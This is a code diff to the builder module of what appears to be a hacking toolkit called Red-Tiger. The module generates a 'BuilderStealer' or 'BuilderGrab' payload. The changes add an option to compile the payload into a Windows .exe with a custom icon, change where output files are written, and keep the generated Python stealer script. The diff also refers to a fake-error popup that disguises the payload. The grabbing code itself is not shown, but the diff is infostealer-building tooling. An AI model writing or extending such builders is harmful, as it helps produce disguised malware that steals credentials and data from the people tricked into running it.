@@ -1458,9 +1458,11 @@ else:
    descritpion_err = []
    title_err = []
 
-print(f"{color.RED}\n{INFO} Custom your file .exe:")
+print(f"{color.RED}\n{INFO} Custom your file:")
+exe_or_not = input(f"{color.RED}{INPUT} Converting to .exe (y/n) -> {color.RESET}")
 name_file = input(f"{color.RED}{INPUT} File Name -> {color.RESET}")
-icone = input(f"{color.RED}{INPUT} Add an Icon ? (y/n) -> {color.RESET}")
+if exe_or_not in ['y', 'Y', 'Yes', 'yes', 'oui', 'Oui']:
+    icone = input(f"{color.RED}{INPUT} Add an Icon ? (y/n) -> {color.RESET}")
 
 FakeError = f'''
 def Fake_Error():
@@ -1482,28 +1484,29 @@ if not name_file.strip():
     random_number = random.randint(1, 1000)
     name_file = f'BuilderGrab_{random_number}'
 
-if icone in ['y', 'Y', 'Yes', 'yes', 'oui', 'Oui']:
- try:
-    def choose_folder():
-       root = Tk()
-       root.withdraw()
-       root.attributes('-topmost', True)
-       icon_path = filedialog.askopenfilename(parent=root, title=f"Red-Tiger {version_tool} | Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
-       return icon_path
-    icon_path = choose_folder()
- except:
-    icone = "n"
+if exe_or_not in ['y', 'Y', 'Yes', 'yes', 'oui', 'Oui']:
+  if icone in ['y', 'Y', 'Yes', 'yes', 'oui', 'Oui']:
+    try:
+        def choose_folder():
+           root = Tk()
+           root.withdraw()
+           root.attributes('-topmost', True)
+           icon_path = filedialog.askopenfilename(parent=root, title=f"{name_tool} {version_tool} | Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
+           return icon_path
+        icon_path = choose_folder()
+    except:
+        icone = "n"
 
-file_text_relative = f'./Settings/Program/BuilderGrab/{name_file}.txt'
+file_text_relative = f'./1-File-Output/BuilderStealer/{name_file}.txt'
 file_text = os.path.abspath(file_text_relative)
 
-file_python_relative = f'./Settings/Program/BuilderGrab/{name_file}.py'
+file_python_relative = f'./1-File-Output/BuilderStealer/{name_file}.py'
 file_python = os.path.abspath(file_python_relative)
 
-path_destination_relative = "./1-File-Output"
+path_destination_relative = "./1-File-Output/BuilderStealer"
 path_destination = os.path.abspath(path_destination_relative)
 
-print(f"{color.RED}\n{INFO} Installing missing modules:{color.RESET}")
+print(f"{color.RED}{INFO} Installing missing modules:{color.RESET}")
 
 file_bat = os.path.abspath("./Settings/Setup-Builder.bat")
 subprocess.call(file_bat, shell=True)
@@ -1540,7 +1543,6 @@ with open(file_text, 'w', encoding='utf-8') as file:
 
     if add_restart in ['y', 'Y', 'Yes', 'yes', 'YES']:
         file.write(Restart)
-    print(f"{color.RED}\n{INFO} Text file created.")
  except Exception as e:
     print(f"{color.RED}\n{ERROR} Text file not created: {color.WHITE}{e}")
 
@@ -1555,7 +1557,7 @@ try:
     with open(file_text, 'w', encoding='utf-8') as file:
         file.write(f"{path_destination}")
 
-    print(f"{color.RED}{INFO} Python file created.")
+    print(f"{color.RED}\n{INFO} Python file created: \"{color.WHITE}{file_python}{color.RED}\"")
 except Exception as e:
    print(f"{color.RED}{ERROR} Python file not created: {color.WHITE}{e}")
 
@@ -1578,21 +1580,23 @@ def convert_to_exe(script_name, destination_path, icon_path=None):
     except Exception as e:
         print(f"{color.RED}{ERROR} Error during conversion: {color.WHITE}{e}")
 
-if icone in ['y', 'Y', 'Yes', 'yes', 'oui', 'Oui']:
- convert_to_exe(file_python, path_destination, icon_path)
-else: 
- convert_to_exe(file_python, path_destination)
+if exe_or_not in ['y', 'Y', 'Yes', 'yes', 'oui', 'Oui']:
+    if icone in ['y', 'Y', 'Yes', 'yes', 'oui', 'Oui']:
+        convert_to_exe(file_python, path_destination, icon_path)
+    else: 
+        convert_to_exe(file_python, path_destination)
 
 print(f"{color.RED}{INFO} Removing temporary files from conversion..{color.RESET}")
+
 try:
     directory = os.getcwd()
-    shutil.rmtree(f"{directory}/build")
-    os.remove(f"{name_file}.spec")
+    if exe_or_not in ['y', 'Y', 'Yes', 'yes', 'oui', 'Oui']:
+        shutil.rmtree(f"{directory}/build")
+        os.remove(f"{name_file}.spec")
     os.remove(file_text)
-    os.remove(file_python)
     print(f"{color.RED}{INFO} Temporary file removed.{color.RESET}")
 except Exception as e:
-   print(f"{color.RED}{ERROR} Temporary file not removed: {color.WHITE}{e}")
+    print(f"{color.RED}{ERROR} Temporary file not removed: {color.WHITE}{e}")
 
 try:
     print(f"{color.RED}{INFO} Open \"{color.WHITE}{path_destination}{color.RED}\"")
